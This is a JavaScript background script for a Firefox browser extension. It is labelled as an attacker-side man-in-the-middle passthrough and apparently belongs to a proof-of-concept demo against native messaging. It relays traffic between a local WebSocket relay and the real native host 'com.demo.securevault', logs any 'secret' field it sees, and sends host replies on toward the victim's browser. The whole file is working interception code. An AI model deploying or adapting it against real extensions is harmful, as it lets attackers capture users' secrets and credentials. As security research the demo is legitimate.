// Attack 1 — Bidirectional MITM: attacker-side passthrough extension.
// Relays messages between the relay WebSocket server (:13500) and the real NM host.
// TARGET is patched to 'com.demo.securevault' by attack1 setup.

const TARGET       = 'com.demo.securevault';   // patched by setup
const RELAY_URL    = 'ws://127.0.0.1:13500';
const RECONNECT_MS = 2000;

let nativePort = null;
let ws = null;

// ── Relay WebSocket ────────────────────────────────────────────────────────────

function connectRelay() {
  if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
    return;
  }
  console.log('[passthrough] connecting to relay...');
  ws = new WebSocket(RELAY_URL);

  ws.onopen = () => {
    console.log('[passthrough] relay connected');
    connectNativeHost();
  };

  ws.onmessage = (event) => {
    // Message from victim extension (via MITM wrapper → relay) → forward to real host
    try {
      const msg = JSON.parse(event.data);
      console.log('[passthrough] relay→host:', JSON.stringify(msg));
      if (!nativePort) connectNativeHost();
      if (nativePort) nativePort.postMessage(msg);
    } catch (e) {
      console.error('[passthrough] relay message parse error:', e);
    }
  };

  ws.onclose = () => {
    console.log('[passthrough] relay disconnected, retrying...');
    ws = null;
    setTimeout(connectRelay, RECONNECT_MS);
  };

  ws.onerror = () => ws && ws.close();
}

// ── Real NM host connection ────────────────────────────────────────────────────

function connectNativeHost() {
  if (nativePort) return;
  console.log('[passthrough] connecting to NM host:', TARGET);
  try {
    nativePort = chrome.runtime.connectNative(TARGET);
  } catch (e) {
    console.error('[passthrough] connectNative failed:', e);
    nativePort = null;
    return;
  }

  nativePort.onMessage.addListener((msg) => {
    // Message from real host → forward to relay → MITM wrapper → victim Firefox
    console.log('[passthrough] host→relay:', JSON.stringify(msg));
    if (msg.secret !== undefined) {
      console.log('[passthrough] *** SECRET OBSERVED ***', msg.secret);
    }
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify(msg));
    }
  });

  nativePort.onDisconnect.addListener(() => {
    const err = chrome.runtime.lastError?.message || '';
    console.warn('[passthrough] NM host disconnected:', err);
    nativePort = null;
    // Reconnect to be ready for the next victim trigger
    setTimeout(connectNativeHost, 1000);
  });
}

// ── Keep background page alive ────────────────────────────────────────────────
// persistent: true in manifest keeps the background page running in Firefox MV2.

// ── Start ──────────────────────────────────────────────────────────────────────

console.log('[passthrough] background page started');
connectRelay();

chrome.runtime.onInstalled.addListener(() => {
  console.log('[passthrough] onInstalled fired');
  connectRelay();
});

chrome.runtime.onStartup.addListener(() => {
  console.log('[passthrough] onStartup fired');
  connectRelay();
});
